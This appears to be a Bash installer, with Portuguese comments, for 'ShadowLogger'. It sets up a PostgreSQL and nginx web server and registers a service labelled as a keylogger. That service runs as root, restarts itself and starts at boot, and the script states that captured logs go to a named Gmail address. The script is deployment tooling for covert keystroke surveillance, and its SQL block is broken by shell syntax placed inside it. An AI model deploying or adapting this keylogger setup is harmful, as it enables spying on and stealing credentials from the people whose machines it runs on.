#!/bin/bash
# install.sh — Script principal de instalação

set -e

echo "🚀 Instalando ShadowLogger..."
echo "📅 $(date)"

# Instala dependências
echo "🔧 Instalando dependências..."
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip python3-venv git nginx postgresql postgresql-contrib certbot python3-certbot-nginx

# Configura PostgreSQL
echo "🗄️ Configurando PostgreSQL..."
sudo -u postgres psql <<EOF
CREATE USER shadowuser WITH PASSWORD 'sua_senha_segura' 2>/dev/null || true;
CREATE DATABASE shadowdb OWNER shadowuser 2>/dev/null || true;
GRANT ALL PRIVILEGES ON DATABASE shadowdb TO shadowuser;
EOF

# Cria ambiente virtual
echo "🐍 Configurando ambiente Python..."
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Configura ShadowServer
echo "🌐 Configurando ShadowServer..."
cd shadowserver

# Cria .env se não existir
if [ ! -f .env ]; then
    cat > .env <<EOF
DATABASE_URL=postgresql://shadowuser:sua_senha_segura@localhost/shadowdb
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
EMAIL_SENDER=renatomfn6@gmail.com
EMAIL_PASSWORD=seu-app-password
EOF
fi

# Configura NGINX
echo "⚙️ Configurando NGINX..."
sudo tee /etc/nginx/sites-available/shadowserver > /dev/null <<'EOF'
server {
    listen 80;
    server_name _;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /ws {
        proxy_pass http://127.0.0.1:5000/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
    }
}
EOF

sudo ln -sf /etc/nginx/sites-available/shadowserver /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# Configura systemd service
echo "🔧 Configurando ShadowServer service..."
sudo tee /etc/systemd/system/shadowserver.service > /dev/null <<'EOF'
[Unit]
Description=ShadowLogger Web Server
After=network.target postgresql.service

[Service]
User=renato
WorkingDirectory=/home/renato/ShadowLogger-Linux/shadowserver
EnvironmentFile=/home/renato/ShadowLogger-Linux/shadowserver/.env
ExecStart=/home/renato/ShadowLogger-Linux/venv/bin/python app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl enable --now shadowserver

# Configura ShadowLogger (cliente)
echo "⌨️ Configurando ShadowLogger (cliente)..."
cd ../shadowlogger

# Cria service para cliente
sudo tee /etc/systemd/system/shadowlogger.service > /dev/null <<'EOF'
[Unit]
Description=ShadowLogger Keylogger
After=network.target

[Service]
User=root
WorkingDirectory=/home/renato/ShadowLogger-Linux/shadowlogger
ExecStart=/usr/bin/python3 /home/renato/ShadowLogger-Linux/shadowlogger/main.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now shadowlogger

echo ""
echo "========================================"
echo "✅ Instalação concluída!"
echo "========================================"
echo "🌐 Acesse: http://$(hostname -I | awk '{print $1}'):5000"
echo "📧 Logs serão enviados para: renatomfn6@gmail.com"
